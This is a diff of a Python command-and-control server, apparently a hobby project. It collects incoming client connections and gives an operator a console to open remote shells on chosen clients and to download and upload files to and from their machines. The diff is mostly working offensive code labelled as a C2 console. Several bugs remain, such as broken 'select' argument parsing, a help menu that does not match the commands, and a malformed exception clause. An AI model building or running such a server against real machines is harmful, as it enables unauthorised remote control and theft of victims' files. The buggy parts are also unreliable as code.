@@ -1,3 +1,5 @@
+from logging import shutdown
+import os
 import socket, threading, time
 import sys
 
@@ -14,14 +16,10 @@ elif len(sys.argv) == 3:
     SERVER_ADDR = sys.argv[1]
     SERVER_PORT = sys.argv[2]
 
-'''
-TO-DO: ESTABLISH TWO SHELLS IN CASE ONE DIES
-'''
-
-
 server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_sock.bind((SERVER_ADDR, SERVER_PORT))
 
+#Start server and listen for new connections
 def startServer():
     server_sock.listen(5)
     print()
@@ -31,16 +29,18 @@ def startServer():
     try:
         while SERVER_UP:
             client_sock, addr = server_sock.accept()
-            # print(f"\nConnection Received From: {addr[0]}:{addr[1]}")
+            # print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
+            # print()
             CURRENT_CONNECTIONS.append(client_sock)
             CURRENT_ADDRESSES.append(addr)
             # print(f"[SERVER] Active Connections: {threading.activeCount() - 6}")
             # print("cmd>")
     except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
+        shutdown_clients()
         server_sock.close()
         SERVER_UP = False
         
-
+#Take socket and addr and issue shell
 def handleClient(client_sock,addr):
     while True:
         try:
@@ -49,14 +49,14 @@ def handleClient(client_sock,addr):
                 client_sock.send(user_in.encode())
                 break
             elif user_in == '':
-                print("No empty commands!")
+                print(f"{addr[0]}>",end='')
             elif user_in.split()[0] == "cd":
                 client_sock.send(user_in.encode())
                 print(f"{addr[0]}>",end='')
                 continue
             else:
                 client_sock.send(user_in.encode())
-                client_sock.settimeout(5.0) #timeout after 5 seconds of no recv
+                client_sock.settimeout(3.0) #timeout after 3 seconds of no recv
                 serv_resp = client_sock.recv(BUFFER_SIZE).decode()
                 client_sock.settimeout(None) #reset timeout
                 print(f"{serv_resp}")
@@ -73,7 +73,7 @@ def handleClient(client_sock,addr):
             print(f"{addr[0]}>",end='')
             continue
     
-
+#Main Console for C2
 def handleCommand():
     while True:
         try:
@@ -81,16 +81,17 @@ def handleCommand():
             if cmd.lower() == "list" or cmd.lower() == "ls":
                 list_clients()
             elif "select" in cmd.lower() or "sel" in cmd.lower():
-                client,addr = select_client(cmd)
-                if client == None:
-                    print("Client does not exist!")
-                else:
-                    handleClient(client,addr)
+                client_console(cmd)
+                # client,addr = select_client(cmd)
+                # if client == None:
+                #     print("Client does not exist!")
+                # else:
+                #     handleClient(client,addr)
             elif cmd.lower() == "help":
                 print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                     \n\tUse 'select' to choose a client from the list. \
                     \n\tUse 'help' to show this menu. \
-                    \n\tUse 'exit' to quit the program. \n")
+                    \n\tUse 'exit' to quit the program.")
             elif cmd.lower() == "exit":
                 print("[SERVER] Server is closing. Goodbye!")
                 #SHUTDOWN ALL CONNECTIONS
@@ -99,12 +100,14 @@ def handleCommand():
                 break
             else:
                 print("Command unknwon. Use 'help' to list commands.")
+        except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
+            print("\nUse 'exit' to close.")
         except Exception as e:
             print("Invalid use of command! \n" + str(e))
+            
 
-
+#List Current Connections
 def list_clients():
-    out = ""
     results = ""
     i = 0
     for client in CURRENT_CONNECTIONS:
@@ -132,35 +135,105 @@ def list_clients():
     else:
         print("No active connections!")
 
-def select_client(cmd):
+
+#Console to send commands to a client when user selects client
+def client_console(cmd):
     try:
         target = cmd.replace("select ", "")
         target = cmd.replace("sel ", "")
         target = int(target)
-        connection = CURRENT_CONNECTIONS[target]
-        addr = CURRENT_ADDRESSES[target]
         print("Connected to: " + str(CURRENT_ADDRESSES[target][0]) + ":" + str(CURRENT_ADDRESSES[target][1]))
-        print("\n" + str(CURRENT_ADDRESSES[target][0]) + ">",end = '')
-        return connection,addr
-    except:
-        print("Invalid!")
+        while True:
+            print("Console: " + str(CURRENT_ADDRESSES[target][0])+">",end="")
+            newCMD = input()
+            if "shell" in newCMD:
+                client = CURRENT_CONNECTIONS[target]
+                addr = CURRENT_ADDRESSES[target]
+                if client == None:
+                    print("Client does not exist!")
+                else:
+                    print("Active Shell On: " + str(CURRENT_ADDRESSES[target][0]) + ":" + str(CURRENT_ADDRESSES[target][1]))
+                    print("\n" + str(CURRENT_ADDRESSES[target][0]) + ">",end = '')
+                    handleClient(client,addr)
+            elif "dl" in newCMD: #Download file
+                download_file(newCMD,CURRENT_CONNECTIONS[target])
+            elif "up" in newCMD: #Upload file
+                upload_file(newCMD,CURRENT_CONNECTIONS[target])
+            elif "help" in newCMD: #Help menu
+                print("\nHelp Menu:\
+                    \n\tUse 'exit' to return to main menu. \
+                    \n\tUse 'help' to show this menu. \
+                    \n\tUse 'shell' to gain a shell on the client's machine \
+                    \n\tUse 'dl' to download a file.\
+                    \n\tUse 'ul' to upload a file.")
+            elif "exit" in newCMD:
+                break
+            else:
+                print("Command unknwon. Use 'help' to list commands.")
+    except Exception as e:
+        print("Invalid use of command! \n" + str(e))
 
+def download_file(cmd,conn):
+    try:
+        conn.send(("DOWNLOAD_FILE_FROM_S3RVER").encode())
+        path = cmd.replace("dl ","")
+        if conn.recv(1024).decode() == "READY":
+            conn.send(path.encode())
+            path = path.split("/")
+            with open(path[len(path)-1],"ab") as f:
+                data = conn.recv(1024)
+                while data:
+                    if data.decode() == "DOWNLOADING_FILE_FROM_S3RVER_COMPLETE":
+                        break
+                    elif data.decode() == "DOWNLOAD_ERROR":
+                        print("File was not found on target machine.")
+                        break
+                    f.write(data)
+                    conn.send("ACK".encode())
+                    data = conn.recv(1024)
+            print(path + " saved to: " + os.getcwd())
+    except KeyboardInterrupt as e:
+        print("File Download Stopped.")
+
+def upload_file(cmd,conn):
+    path = cmd.replace("up ","")
+    conn.send(("UPLOADING_FILE_FROM_S3RVER " + path).encode())
+    if conn.recv(1024).decode() == "READY":
+        try:
+            with open(path,"rb") as f:
+                data = f.read(1024)
+                while data:
+                    conn.send(data)
+                    print("Sending!")
+                    if(conn.recv(1024).decode()) == "ACK":
+                        data = f.read(1024)
+                    else:
+                        print("An error has occured!")
+                        break
+
+            conn.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
+            if conn.recv(1024).decode() == "DONE":
+                print("File uploaded successfully!")
+
+        except FileNotFoundError or FileExistsError as e:
+            conn.send("DOWNLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
+            print("File not found! \n"+ str(e))
+
+
+#Start server as a thread to constantly accept new clients, then open the C2 console.
 def create_threads():
-    t = threading.Thread(target=startServer)
+    t = threading.Thread(target=startServer) 
     t.daemon = True
     t.start()
     time.sleep(1)
     handleCommand()
-    # for _ in range(2):
-    #     t = threading.Thread(target=thread_selector)
-    #     t.daemon = True
-    #     t.start()
 
+#Disconnect all clients and end sockets
 def shutdown_clients():
     for conn in CURRENT_CONNECTIONS:
         conn.send("SERVER_SHUTDOWN".encode())
 
 if __name__ == "__main__":
-    print("[SERVER] Server is starting...")
+    print("[SERVER] Server is starting...") 
     create_threads()
 
